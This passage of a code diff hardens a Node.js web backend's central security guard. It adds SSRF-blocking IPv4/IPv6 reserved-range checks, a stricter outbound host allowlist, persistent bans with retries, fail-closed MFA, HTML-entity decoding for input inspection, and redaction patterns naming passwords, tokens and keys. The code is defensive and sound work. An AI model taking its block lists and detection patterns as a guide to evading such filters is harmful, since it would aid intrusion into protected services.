+    const ipv4 = text.slice(lastColon + 1).split('.').map(Number);
+    if (ipv4.length !== 4 || ipv4.some((item) => !Number.isInteger(item) || item < 0 || item > 255)) return null;
+    text = text.slice(0, lastColon) + ':' + ((ipv4[0] << 8) | ipv4[1]).toString(16) + ':' + ((ipv4[2] << 8) | ipv4[3]).toString(16);
+  }
+  const halves = text.split('::');
+  if (halves.length > 2) return null;
+  const left = halves[0] ? halves[0].split(':').filter(Boolean) : [];
+  const right = halves.length === 2 && halves[1] ? halves[1].split(':').filter(Boolean) : [];
+  const missing = 8 - left.length - right.length;
+  if ((halves.length === 1 && missing !== 0) || missing < 0) return null;
+  const words = [...left, ...Array(halves.length === 2 ? missing : 0).fill('0'), ...right];
+  if (words.length !== 8 || words.some((word) => !/^[0-9a-f]{1,4}$/.test(word))) return null;
+  const bytes = Buffer.alloc(16);
+  words.forEach((word, index) => bytes.writeUInt16BE(parseInt(word, 16), index * 2));
+  return bytes;
+}
+
+function diracCentralIpv4FromBytesV228(bytes, offset) {
+  if (!Buffer.isBuffer(bytes) || bytes.length < offset + 4) return '';
+  return [bytes[offset], bytes[offset + 1], bytes[offset + 2], bytes[offset + 3]].join('.');
+}
+
 function diracCentralIsUnsafeIpV146(ip) {
-  const clean = String(ip || '').trim().toLowerCase();
-  if (!clean) return false;
-  if (clean === '127.0.0.1' || clean === '0.0.0.0' || clean === '::1') return true;
-  if (/^10\./.test(clean) || /^192\.168\./.test(clean) || /^169\.254\./.test(clean)) return true;
-  if (/^172\.(?:1[6-9]|2\d|3[0-1])\./.test(clean)) return true;
-  if (/^(fc|fd)[0-9a-f]{2}:/i.test(clean) || /^fe80:/i.test(clean)) return true;
+  let clean = String(ip || '').trim().toLowerCase().replace(/^\[|\]$/g, '').split('%')[0];
+  if (!clean) return true;
+  let version = 0;
+  try { version = require('net').isIP(clean); } catch (_) { version = 0; }
+  if (!version) return true;
+  if (version === 4) {
+    const octets = clean.split('.').map(Number);
+    if (octets.length !== 4 || octets.some((value) => !Number.isInteger(value) || value < 0 || value > 255)) return true;
+    const [a, b, c] = octets;
+    return a === 0
+      || a === 10
+      || a === 127
+      || (a === 100 && b >= 64 && b <= 127)
+      || (a === 169 && b === 254)
+      || (a === 172 && b >= 16 && b <= 31)
+      || (a === 192 && b === 0)
+      || (a === 192 && b === 168)
+      || (a === 192 && b === 0 && c === 2)
+      || (a === 198 && (b === 18 || b === 19))
+      || (a === 198 && b === 51 && c === 100)
+      || (a === 203 && b === 0 && c === 113)
+      || a >= 224;
+  }
+  const bytes = diracCentralIpv6BytesV228(clean);
+  if (!bytes) return true;
+  const prefix = (offset, values) => values.every((value, index) => bytes[offset + index] === value);
+  if (bytes.every((value) => value === 0)) return true;
+  if (bytes.slice(0, 15).every((value) => value === 0) && bytes[15] === 1) return true;
+  if ((bytes[0] & 0xfe) === 0xfc) return true;
+  if (bytes[0] === 0xfe && (bytes[1] & 0xc0) === 0x80) return true;
+  if (bytes[0] === 0xfe && (bytes[1] & 0xc0) === 0xc0) return true;
+  if (bytes[0] === 0xff) return true;
+  if (prefix(0, [0x20, 0x01, 0x0d, 0xb8])) return true;
+  if (prefix(0, [0x01, 0x00]) && bytes.slice(2, 8).every((value) => value === 0)) return true;
+  if (prefix(0, [0x20, 0x01, 0x00, 0x00])) return true;
+  if (prefix(0, [0x20, 0x01, 0x00, 0x02])) return true;
+  if (prefix(0, [0x20, 0x01, 0x00, 0x10]) || prefix(0, [0x20, 0x01, 0x00, 0x20])) return true;
+  if (prefix(0, [0x00, 0x64, 0xff, 0x9b, 0x00, 0x01])) return true;
+  if (bytes.slice(0, 10).every((value) => value === 0) && bytes[10] === 0xff && bytes[11] === 0xff) return true;
+  if (prefix(0, [0x00, 0x64, 0xff, 0x9b])) return true;
+  if (prefix(0, [0x20, 0x02])) return true;
   return false;
 }
 
@@ -27653,22 +37406,22 @@ function diracCentralAllowedEgressHostV146(host) {
     'developers.hostinger.com',
     'api.resend.com',
     'api.brevo.com',
-    'api.midtrans.com',
     'app.midtrans.com',
     'app.sandbox.midtrans.com',
     'www.googleapis.com',
     'api.name.com',
     'www.namesilo.com',
-    'whoisjson.com',
-    'whoisjsonapi.com'
+    'whoisjson.com'
   ]);
-  try {
-    ['DOMAIN_SUPABASE_URL', 'SUPABASE_URL', 'NEXT_PUBLIC_SUPABASE_URL', 'DIRAC_RECOVERY_WORKER_URL'].forEach((name) => {
+  [...Object.keys(process.env).filter((name) => /SUPABASE_URL$/.test(name)),
+    'NAMECOM_API_BASE', 'NAMESILO_API_BASE', 'WHOISJSON_API_BASE', 'HOSTINGER_API_BASE',
+    'DIRAC_RECOVERY_WORKER_URL', 'DIRAC_LOGIN_SECURITY_WEBHOOK_URL'].forEach((name) => {
+    try {
       const value = String(process.env[name] || '').trim();
       if (value) allowed.add(new URL(value).hostname.toLowerCase());
-    });
-  } catch (_) {}
-  return allowed.has(host) || /\.supabase\.co$/i.test(host);
+    } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  });
+  return allowed.has(String(host || '').toLowerCase());
 }
 
 function diracCentralCircuitBreakerV146(req, ctx, event) {
@@ -27684,6 +37437,8 @@ function diracCentralCircuitBreakerV146(req, ctx, event) {
 async function diracCentralBanAndBlockV146(req, res, ctx, action, method, reason) {
   try { await Promise.resolve(diracCentralCircuitBreakerV146(req, ctx, reason || 'block')); } catch (_) {}
   const now = Date.now();
+  // One Central Guard failure is one persistent hard ban. Successful request
+  // behavior is unchanged; only the former non-persistent failure path is removed.
   const blockedUntilMs = now + diracCentralBlockMsV146();
   const threat = {
     detected: true,
@@ -27691,9 +37446,11 @@ async function diracCentralBanAndBlockV146(req, res, ctx, action, method, reason
     source: DIRAC_CENTRAL_SECURITY_GUARD_V146,
     risk: 'critical'
   };
-  await diracCentralWritePersistentBanV146(req, res, action, method, threat).catch(() => null);
+  const hardBanResult = await diracCentralWritePersistentBanV146(req, res, action, method, threat)
+    .catch(() => ({ ok: false }));
   const identityKey = String(ctx && ctx.identity && ctx.identity.key || '').trim();
-  if (identityKey && typeof writePersistentSecurityJson === 'function') {
+  let identityBanWritten = false;
+  if (identityKey && typeof writePersistentSecurityJsonRequiredV194 === 'function') {
     const centralBanRecord = {
       type: 'central_guard_global_ban_v146',
       action: String(action || '').slice(0, 80),
@@ -27704,51 +37461,142 @@ async function diracCentralBanAndBlockV146(req, res, ctx, action, method, reason
       blocked_until_ms: blockedUntilMs,
       created_at: new Date(now).toISOString()
     };
-    if (threat.kind === 'central_guard_error' && ctx && ctx.centralErrorDebugV155) {
+    if (threat.kind === 'central_guard_error' && !diracCentralIsProductionV146() && ctx && ctx.centralErrorDebugV155) {
       centralBanRecord.safe_debug = ctx.centralErrorDebugV155;
     }
-    await writePersistentSecurityJson(identityKey, centralBanRecord, blockedUntilMs, Math.ceil((blockedUntilMs - now) / 1000)).catch(() => false);
+    identityBanWritten = await writePersistentSecurityJsonRequiredV194(
+      identityKey,
+      centralBanRecord,
+      blockedUntilMs,
+      Math.ceil((blockedUntilMs - now) / 1000)
+    ).catch(() => false);
   }
+  if (identityKey) DIRAC_CENTRAL_NEGATIVE_BAN_V146.delete(identityKey);
   diracCentralSetMemoryBanV146(ctx && ctx.identity, blockedUntilMs, reason);
+  if (ctx) ctx.__diracCentralPersistentBanWrittenV194 = Boolean(identityBanWritten || hardBanResult && hardBanResult.ok === true);
+  if (!(identityBanWritten || hardBanResult && hardBanResult.ok === true)) {
+    return diracCentralPersistenceUnavailableResponseV210(res);
+  }
   return diracCentralBlockedResponseV146(res, reason);
 }
 
 async function diracCentralBanCurrentContextV146(reason) {
   const ctx = diracCentralCurrentContextV149();
   if (!ctx) return { ok: false };
-  return diracCentralWritePersistentBanV146(ctx.req, ctx.res, ctx.action, ctx.method, {
+  const now = Date.now();
+  const blockedUntilMs = now + diracCentralBlockMsV146();
+  const cleanReason = String(reason || 'central_security_block').slice(0, 100);
+  const threat = {
     detected: true,
-    kind: reason,
+    kind: cleanReason,
     source: DIRAC_CENTRAL_SECURITY_GUARD_V146,
     risk: 'critical'
-  });
+  };
+  const hardBanResult = await diracCentralWritePersistentBanV146(
+    ctx.req,
+    ctx.res,
+    ctx.action,
+    ctx.method,
+    threat
+  ).catch(() => ({ ok: false }));
+
+  const identityKey = String(ctx.identity && ctx.identity.key || '').trim();
+  let identityBanWritten = false;
+  if (identityKey && typeof writePersistentSecurityJsonRequiredV194 === 'function') {
+    identityBanWritten = await writePersistentSecurityJsonRequiredV194(
+      identityKey,
+      {
+        type: 'central_guard_global_ban_v146',
+        action: String(ctx.action || '').slice(0, 80),
+        method: String(ctx.method || '').slice(0, 12),
+        reason: cleanReason,
+        source: DIRAC_CENTRAL_SECURITY_GUARD_V146,
+        risk: 'critical',
+        diagnostic_patch: ctx.serviceRoleDebugV212 ? DIRAC_CENTRAL_OWNER_DEBUG_V212 : undefined,
+        diagnostic_code: String(ctx.serviceRoleDebugV212 && ctx.serviceRoleDebugV212.diagnostic_code || '').slice(0, 160) || undefined,
+        diagnostic_point: String(ctx.serviceRoleDebugV212 && ctx.serviceRoleDebugV212.failure_point || '').slice(0, 180) || undefined,
+        blocked_until_ms: blockedUntilMs,
+        created_at: new Date(now).toISOString()
+      },
+      blockedUntilMs,
+      Math.ceil((blockedUntilMs - now) / 1000)
+    ).catch(() => false);
+  }
+
+  if (identityKey) DIRAC_CENTRAL_NEGATIVE_BAN_V146.delete(identityKey);
+  diracCentralSetMemoryBanV146(ctx.identity, blockedUntilMs, cleanReason);
+  ctx.__diracCentralPersistentBanWrittenV194 = Boolean(identityBanWritten || hardBanResult && hardBanResult.ok === true);
+  return {
+    ok: ctx.__diracCentralPersistentBanWrittenV194,
+    persistent: ctx.__diracCentralPersistentBanWrittenV194,
+    blockedUntilMs
+  };
 }
 
 async function diracCentralWritePersistentBanV146(req, res, action, method, threat) {
-  try {
-    if (typeof diracV107RegisterHardBan === 'function') {
-      return await diracV107RegisterHardBan(req, res || null, action || 'central_security', method || 'GET', threat || {});
+  let lastResult = { ok: false };
+  if (typeof diracV107RegisterHardBan === 'function') {
+    for (let attempt = 0; attempt < 3; attempt += 1) {
+      try {
+        lastResult = await diracV107RegisterHardBan(req, res || null, action || 'central_security', method || 'GET', threat || {});
+        if (lastResult && lastResult.ok === true) return lastResult;
+      } catch (_) {}
     }
-  } catch (_) {}
-  try {
-    if (typeof diracV143WriteGlobalBanOnce === 'function') {
-      return await diracV143WriteGlobalBanOnce(req, res || null, action || 'central_security', method || 'GET', threat || {});
+  }
+  if (typeof diracV143WriteGlobalBanOnce === 'function') {
+    for (let attempt = 0; attempt < 3; attempt += 1) {
+      try {
+        lastResult = await diracV143WriteGlobalBanOnce(req, res || null, action || 'central_security', method || 'GET', threat || {});
+        if (lastResult && lastResult.ok === true) return lastResult;
+      } catch (_) {}
     }
-  } catch (_) {}
-  return { ok: false };
+  }
+  return lastResult && typeof lastResult === 'object' ? lastResult : { ok: false };
 }
 
 function diracCentralBlockedResponseV146(res, reason) {
+  const ctx = diracCentralCurrentContextV149();
   diracCentralApplyHeadersV146(res);
-  try { if (res && typeof res.setHeader === 'function') res.setHeader('Cache-Control', 'no-store'); } catch (_) {}
+  try { if (res && typeof res.setHeader === 'function') res.setHeader('Cache-Control', 'no-store'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   const publicReason = diracCentralIsProductionV146() ? 'blocked' : String(reason || 'blocked').slice(0, 80);
-  return res.status(403).json({
+  const payload = {
     ok: false,
     code: 'CENTRAL_SECURITY_BLOCKED',
     message: 'Permintaan ditolak oleh sistem keamanan.',
     reason: publicReason,
-    source: DIRAC_CENTRAL_SECURITY_GUARD_V146
-  });
+    source: DIRAC_CENTRAL_SECURITY_GUARD_V146,
+    request_id: String(ctx && ctx.requestId || '').slice(0, 64),
+    failure_id: diracCentralFailureIdV211(ctx)
+  };
+  if (diracCentralDebugResponseAllowedV211(ctx)) {
+    payload.debug = {
+      patch: DIRAC_CENTRAL_FAIL_CLOSED_DEBUG_V211,
+      failed_stage: String(ctx && ctx.failedStageV211 || ctx && ctx.currentStageV211 || '').slice(0, 80),
+      failed_stage_index: Number((ctx && ctx.currentStageIndexV211) ?? -1),
+      internal_reason: String(reason || ctx && ctx.failureReasonV211 || 'blocked').slice(0, 120),
+      stage_trace: diracCentralStageTraceV211(ctx, 30),
+      owner_resolution: ctx && ctx.ownerResolutionDebugV212 || undefined,
+      service_role: ctx && ctx.serviceRoleDebugV212 || undefined,
+      safe_error: ctx && ctx.centralErrorDebugV155 || undefined
+    };
+  }
+  return res.status(403).json(payload);
+}
+
+function diracCentralPersistenceUnavailableResponseV210(res) {
+  const ctx = diracCentralCurrentContextV149();
+  diracCentralApplyHeadersV146(res);
+  try { if (res && typeof res.setHeader === 'function') res.setHeader('Cache-Control', 'no-store'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  const payload = {
+    ok: false,
+    code: 'CENTRAL_SECURITY_PERSISTENCE_UNAVAILABLE',
+    message: 'Permintaan ditolak karena penyimpanan keamanan belum tersedia.',
+    source: DIRAC_CENTRAL_SECURITY_GUARD_V146,
+    request_id: String(ctx && ctx.requestId || '').slice(0, 64),
+    failure_id: diracCentralFailureIdV211(ctx)
+  };
+  if (diracCentralDebugResponseAllowedV211(ctx)) payload.debug = ctx && ctx.centralErrorDebugV155 || diracCentralStageTraceV211(ctx, 30);
+  return res.status(503).json(payload);
 }
 
 function diracCentralDisabledResponseV146(res) {
@@ -27772,18 +37620,18 @@ function diracCentralStableMfaReadGateV146(req, res, ctx) {
     const proof = String(cookies && cookies[cookieName] || '').trim();
     if (proof) return { handled: false };
   } catch (_) {
-    return { handled: false };
+    return { handled: true, reason: 'mfa_guard_unavailable' };
   }
   return { handled: true, reason: 'mfa_required' };
 }
 
 function diracCentralContractForActionV146(action) {
   const clean = String(action || '');
-  const commonGet = ['action', '_csrf_boot', '_csrf_a2f', '_csrf_login_final', '_csrf_probe', '_dirac_page_nonce_for', '_page_nonce_for', 'page_nonce_for', '_ts', '_t', '_', 'domain', 'limit', 'type', 'include_expired', 'order_id', 'order_code', 'domain_order_id', 'payment_id', 'transaction_id', 'invoice_id', 'gateway_reference', 'session_id', 'recovery_code_id', 'credential_id', 'project_id', 'document_id', 'item_id', 'email', 'slug'];
+  const commonGet = ['action', '_csrf_boot', '_csrf_a2f', '_csrf_login_final', '_csrf_probe', '_dirac_page_nonce_for', '_page_nonce_for', 'page_nonce_for', '_dirac_a2f_body_hash', '_ts', '_t', '_', 'domain', 'limit', 'type', 'include_expired', 'order_id', 'order_code', 'domain_order_id', 'payment_id', 'transaction_id', 'invoice_id', 'gateway_reference', 'session_id', 'recovery_code_id', 'credential_id', 'project_id', 'document_id', 'item_id', 'email', 'slug'];
   const commonPost = ['action', 'email', 'password', 'fullName', 'full_name', 'name', 'phone', 'domain', 'domain_name', 'quantity', 'items', 'order_id', 'order_code', 'domain_order_id', 'payment_id', 'transaction_id', 'invoice_id', 'gateway_reference', 'session_id', 'recovery_code', 'recovery_code_id', 'credential_id', 'user_id', 'challenge', 'response', 'setupToken', 'mfaSetupToken', 'code', 'reason', 'csrf', 'nonce', 'idempotency_key'];
   const getOnly = { methods: ['GET', 'HEAD'], allowed: commonGet, required: [], maxBodyBytes: 1024, maxFieldBytes: 3000, mutation: false };
   const postOnly = { methods: ['POST'], allowed: commonPost, required: [], maxBodyBytes: 20 * 1024, maxFieldBytes: 3000, mutation: true };
-  const passkeyPost = { methods: ['POST'], allowed: ['action', 'method', 'identifier', 'email', 'setupToken', 'mfaSetupToken', 'token', 'passkeyMode', 'credential', 'id', 'rawId', 'type', 'response', 'clientExtensionResults', 'credProps', 'rk', 'clientDataJSON', 'attestationObject', 'authenticatorData', 'signature', 'userHandle', 'transports', 'authenticatorAttachment', 'challenge', 'code', 'csrf', 'nonce', 'idempotency_key'], required: [], maxBodyBytes: 192 * 1024, maxFieldBytes: 80 * 1024, mutation: true, allowArrayItems: true };
+  const passkeyPost = { methods: ['POST'], allowed: ['action', 'method', 'identifier', 'email', 'setupToken', 'mfaSetupToken', 'token', 'passkeyMode', 'credential', 'id', 'rawId', 'type', 'response', 'clientExtensionResults', 'credProps', 'rk', 'clientDataJSON', 'attestationObject', 'authenticatorData', 'signature', 'userHandle', 'transports', 'authenticatorAttachment', 'challenge', 'code', 'recovery_session_token', 'recoverySessionToken', 'lost_passkey_recovery_session_token', 'lostPasskeyRecoverySessionToken', 'dirac_lost_passkey_recovery_session', 'csrf', 'nonce', 'idempotency_key'], required: [], maxBodyBytes: 192 * 1024, maxFieldBytes: 80 * 1024, mutation: true, allowArrayItems: true };
   const recoveryGeneratePost = { methods: ['POST'], allowed: ['action', 'csrf', 'nonce', 'idempotency_key', 'account_password', 'current_password', 'currentPassword'], required: [], maxBodyBytes: 2048, maxFieldBytes: 1024, mutation: true };
   const recoveryVerifyPost = { methods: ['POST'], allowed: ['action', 'request_id', 'recovery_code', 'code', 'csrf', 'nonce', 'idempotency_key'], required: ['request_id'], maxBodyBytes: 4096, maxFieldBytes: 1200, mutation: true };
   const recoveryWorkerPost = {
@@ -27879,7 +37727,7 @@ function diracCentralContractForActionV146(action) {
     dirac_mfa_passkey_verify: passkeyPost,
     domain_mfa_passkey_start: passkeyPost,
     domain_mfa_passkey_verify: passkeyPost,
-    security_report: { ...postOnly, allowed: ['action', 'reason', 'type', 'page', 'event', 'nonce', 'csrf'], maxBodyBytes: 8 * 1024 },
+    security_report: { ...postOnly, allowed: ['action', 'reason', 'type', 'page', 'event', 'nonce', 'csrf', 'evidence', 'version', 'incident_id', 'reporter_server_id', 'reporter_key_version', 'offender_server_id', 'offender_key_version', 'target_server_id', 'original_request_id', 'original_nonce', 'original_body_sha512', 'failure_code', 'failed_signature_indexes', 'attributed_valid_signature_count', 'detected_at_ms', 'method', 'path', 'evidence_hash'], maxBodyBytes: 32 * 1024, maxFieldBytes: 24 * 1024, allowArrayItems: true, allowProtectedFields: true },
     midtrans_webhook: { methods: ['POST'], allowed: ['transaction_time', 'transaction_status', 'transaction_id', 'status_message', 'status_code', 'signature_key', 'payment_type', 'order_id', 'merchant_id', 'gross_amount', 'fraud_status', 'currency', 'settlement_time', 'expiry_time'], required: ['order_id', 'status_code', 'gross_amount', 'signature_key'], maxBodyBytes: 64 * 1024, maxFieldBytes: 3000, mutation: true, allowExtra: true, allowProtectedFields: true }
   };
   return contracts[clean] || { methods: [], allowed: [], required: [], maxBodyBytes: 0, maxFieldBytes: 0, mutation: false };
@@ -27955,7 +37803,7 @@ function diracCentralExtractValuesV146(value) {
   const raw = String(value === undefined || value === null ? '' : value).trim();
   if (!raw) return [];
   const samples = [raw];
-  try { samples.push(decodeURIComponent(raw)); } catch (_) {}
+  try { samples.push(decodeURIComponent(raw)); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return Array.from(new Set(samples.flatMap((sample) => String(sample || '').split(/[\s,|]+/))
     .map((part) => part.replace(/^(?:eq|in|is)\./i, '').replace(/^\(/, '').replace(/\)$/, '').replace(/^['"]|['"]$/g, '').trim())
     .filter(Boolean))).slice(0, 20);
@@ -27967,10 +37815,23 @@ function diracCentralNormalizeKeyV146(key) {
 
 function diracCentralHtmlEntityDecodeV146(value) {
   return String(value || '')
+    .replace(/&#x([0-9a-f]{1,6});?/gi, (_, hex) => {
+      const code = parseInt(hex, 16);
+      return Number.isInteger(code) && code <= 0x10ffff && !(code >= 0xd800 && code <= 0xdfff) ? String.fromCodePoint(code) : '';
+    })
+    .replace(/&#([0-9]{1,7});?/g, (_, decimal) => {
+      const code = parseInt(decimal, 10);
+      return Number.isInteger(code) && code <= 0x10ffff && !(code >= 0xd800 && code <= 0xdfff) ? String.fromCodePoint(code) : '';
+    })
     .replace(/&lt;/gi, '<')
     .replace(/&gt;/gi, '>')
     .replace(/&quot;/gi, '"')
-    .replace(/&#x27;|&#39;/gi, "'")
+    .replace(/&apos;|&#x27;|&#39;/gi, "'")
+    .replace(/&colon;/gi, ':')
+    .replace(/&sol;/gi, '/')
+    .replace(/&bsol;/gi, '\\')
+    .replace(/&Tab;/gi, '\t')
+    .replace(/&NewLine;/gi, '\n')
     .replace(/&amp;/gi, '&');
 }
 
@@ -28019,7 +37880,7 @@ function diracCentralIsUnsafeHostV146(host) {
 }
 
 function diracCentralLooksLikeUuidV146(value) {
-  try { if (typeof customerSecurityLooksLikeUuid === 'function') return customerSecurityLooksLikeUuid(value); } catch (_) {}
+  try { if (typeof customerSecurityLooksLikeUuid === 'function') return customerSecurityLooksLikeUuid(value); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(String(value || '').trim());
 }
 
@@ -28081,6 +37942,11 @@ function diracCentralDeriveSecretV146(scope, inputSecret) {
 
 function assertProductionSecurityConfigV146() {
   if (!diracCentralIsProductionV146()) return true;
+  if (!DIRAC_CENTRAL_ASYNC_CONTEXT_V149
+      || typeof DIRAC_CENTRAL_ASYNC_CONTEXT_V149.run !== 'function'
+      || typeof DIRAC_CENTRAL_ASYNC_CONTEXT_V149.getStore !== 'function') {
+    throw new Error('DIRAC_ASYNC_REQUEST_CONTEXT_REQUIRED');
+  }
   const blockedTrue = [
     'PUBLIC_DOMAIN_CHECK_RATE_DISABLED',
     'DIRAC_ULTRA_RATE_LIMIT_DISABLED',
@@ -28103,7 +37969,11 @@ function assertProductionSecurityConfigV146() {
     'DIRAC_BOLA_IDOR_GLOBAL_BAN_DISABLED',
     'DIRAC_SECURITY_WRITE_COALESCER_DISABLED',
     'DIRAC_A2F_REQUEST_SIGNATURE_DISABLED',
-    'DIRAC_A2F_STRICT_CENTRAL_GUARD_DISABLED'
+    'DIRAC_A2F_STRICT_CENTRAL_GUARD_DISABLED',
+    'DIRAC_RECOVERY_WORKER_DEBUG',
+    'DIRAC_RECOVERY_WORKER_ROOT_CAUSE_DEBUG',
+    'DIRAC_LOST_PASSKEY_LINK_DEBUG',
+    'DIRAC_LOST_PASSKEY_LINK_OPEN_DEBUG'
   ];
   const weakened = blockedTrue.filter((name) => {
     try { return isEnvTrue(name) || diracV143EnvTrue(name) || diracV145EnvTrue(name); } catch (_) { return false; }
@@ -28113,6 +37983,16 @@ function assertProductionSecurityConfigV146() {
     throw new Error('DOMAIN_COOKIE_SAMESITE production wajib Strict.');
   }
   if (!LOGIN_SECURITY_PERSIST_TABLE) throw new Error('LOGIN_SECURITY_PERSIST_TABLE production wajib untuk ban/rate-limit persistent.');
+  if (typeof readPersistentSecurityJsonStrictV194 !== 'function'
+      || typeof readPersistentSecurityJsonManyStrictV194 !== 'function'
+      || typeof writePersistentSecurityJsonRequiredV194 !== 'function'
+      || typeof claimPersistentSecurityKeyOnceV194 !== 'function') {
+    throw new Error('Persistent security storage strict guard wajib aktif di production.');
+  }
+  const adminSecret = String(process.env.AI_ADMIN_SECRET || '');
+  if (adminSecret && Buffer.byteLength(adminSecret, 'utf8') < 32) {
+    throw new Error('AI_ADMIN_SECRET production wajib minimal 32 byte bila digunakan.');
+  }
   diracCentralRootSecretV146();
   return true;
 }
@@ -28127,8 +38007,15 @@ function diracCentralSecretV146() {
 }
 
 function diracCentralHashV146(value) {
-  try { return crypto.createHmac('sha256', diracCentralSecretV146()).update(String(value || '')).digest('hex'); } catch (_) {}
-  return crypto.createHash('sha256').update(String(value || '')).digest('hex');
+  const secret = diracCentralSecretV146();
+  if (!Buffer.isBuffer(secret) || secret.length < 64) {
+    const error = new Error('DIRAC_CENTRAL_HASH_SECRET_INVALID');
+    error.code = 'DIRAC_CENTRAL_HASH_SECRET_INVALID';
+    throw error;
+  }
+  return crypto.createHmac('sha256', secret)
+    .update(String(value || ''), 'utf8')
+    .digest('hex');
 }
 
 function diracCentralFakeResponseV146() {
@@ -28145,22 +38032,18 @@ function diracCentralFakeResponseV146() {
 }
 
 function diracCentralSafeErrorV146(error) {
-  const message = String(error && (error.code || error.name || error.message) || error || 'central_security_error');
-  if (/password|token|secret|cookie|authorization|service_role|apikey|csrf|hmac|hash/i.test(message)) return 'central_security_internal_error';
-  return message.slice(0, 180);
+  return diracSecurityRedactDiagnosticV210(error, 180);
 }
 
 function diracCentralSafeDebugErrorV155(error, ctx) {
   const rawName = String(error && error.name || 'Error').replace(/[^a-zA-Z0-9_.-]/g, '').slice(0, 80) || 'Error';
   const rawCode = String(error && error.code || '').replace(/[^a-zA-Z0-9_.-]/g, '').slice(0, 80);
-  const rawMessage = String(error && error.message || error || 'central_security_error');
-  const sensitivePattern = /password|token|secret|cookie|authorization|service_role|apikey|csrf|hmac|hash|private[_-]?key|owner[_-]?master/i;
-  const safeMessage = sensitivePattern.test(rawMessage)
-    ? 'redacted_sensitive_error_message'
-    : rawMessage.replace(/[\r\n\t]+/g, ' ').slice(0, 260);
+  const rawMessage = String(error && error.message || error || 'central_error');
+  const safeMessage = diracSecurityRedactDiagnosticV210(rawMessage, 260);
+  const sensitivePattern = /(?:authorization|bearer|cookie|secret|service[_-]?role|access[_-]?token|refresh[_-]?token|password|passkey|private[_-]?key|api[_-]?key|argon2|pepper|signature)\s*[:=]/i;
   const stack = String(error && error.stack || '')
     .split('\n')
-    .slice(1, 8)
+    .slice(1, 10)
     .map((line) => line.trim())
     .filter(Boolean)
     .map((line) => line
@@ -28170,18 +38053,29 @@ function diracCentralSafeDebugErrorV155(error, ctx) {
       .slice(0, 180));
 
   const pass = ctx && ctx.guardPassport && typeof ctx.guardPassport === 'object' ? ctx.guardPassport : {};
-  const passedStages = Object.keys(pass).filter((key) => pass[key]).slice(-12);
+  const passedStages = Object.keys(pass).filter((key) => pass[key]);
 
   return {
-    safe_error_debug_version: 'v155',
-    action: String(ctx && ctx.action || '').slice(0, 80),
+    safe_error_debug_version: 'v211',
+    patch: DIRAC_CENTRAL_FAIL_CLOSED_DEBUG_V211,
+    request_id: String(ctx && ctx.requestId || '').slice(0, 64),
+    failure_id: diracCentralFailureIdV211(ctx),
+    action: String(ctx && ctx.action || ctx && ctx.rawAction || '').slice(0, 80),
     method: String(ctx && ctx.method || '').slice(0, 12),
+    execution_phase: String(ctx && ctx.executionPhaseV211 || '').slice(0, 30),
+    failed_stage: String(ctx && ctx.failedStageV211 || error && error.diracStage || ctx && ctx.currentStageV211 || '').slice(0, 80),
+    failed_stage_index: Number((error && error.diracStageIndex) ?? (ctx && ctx.currentStageIndexV211) ?? -1),
+    failure_reason: String(ctx && ctx.failureReasonV211 || rawCode || safeMessage).slice(0, 160),
     error_name: rawName,
     error_code: rawCode || undefined,
     safe_message: safeMessage,
-    message_was_redacted: sensitivePattern.test(rawMessage),
-    last_guard_stages: passedStages,
+    message_was_redacted: safeMessage !== rawMessage || sensitivePattern.test(rawMessage),
+    passed_guard_count: passedStages.length,
+    passed_guard_stages: passedStages.slice(-30),
     handler_already_entered: Boolean(ctx && ctx.req && ctx.req.__diracCentralSecurityGuardPassedV146),
+    stage_trace: diracCentralStageTraceV211(ctx, 30),
+    owner_resolution: ctx && ctx.ownerResolutionDebugV212 || undefined,
+    service_role: ctx && ctx.serviceRoleDebugV212 || undefined,
     stack_top: stack
   };
 }
@@ -28194,7 +38088,7 @@ try {
     };
     Object.defineProperty(diracCsrfShouldCheckRequest, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV137CsrfShouldForceV146 = typeof diracV137CsrfShouldForce === 'function' ? diracV137CsrfShouldForce : null;
@@ -28204,7 +38098,7 @@ try {
     };
     Object.defineProperty(diracV137CsrfShouldForce, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV138CsrfShouldForceV146 = typeof diracV138CsrfShouldForce === 'function' ? diracV138CsrfShouldForce : null;
@@ -28214,7 +38108,7 @@ try {
     };
     Object.defineProperty(diracV138CsrfShouldForce, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV128InspectHttpV146 = typeof diracBolaIdorV128InspectHttpRequest === 'function' ? diracBolaIdorV128InspectHttpRequest : null;
@@ -28224,7 +38118,7 @@ try {
     };
     Object.defineProperty(diracBolaIdorV128InspectHttpRequest, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV132InspectHttpV146 = typeof diracBolaIdorV132InspectHttpQuery === 'function' ? diracBolaIdorV132InspectHttpQuery : null;
@@ -28234,7 +38128,7 @@ try {
     };
     Object.defineProperty(diracBolaIdorV132InspectHttpQuery, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV133InspectHttpV146 = typeof diracBolaIdorV133InspectHttpRequest === 'function' ? diracBolaIdorV133InspectHttpRequest : null;
@@ -28244,9 +38138,1968 @@ try {
     };
     Object.defineProperty(diracBolaIdorV133InspectHttpRequest, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
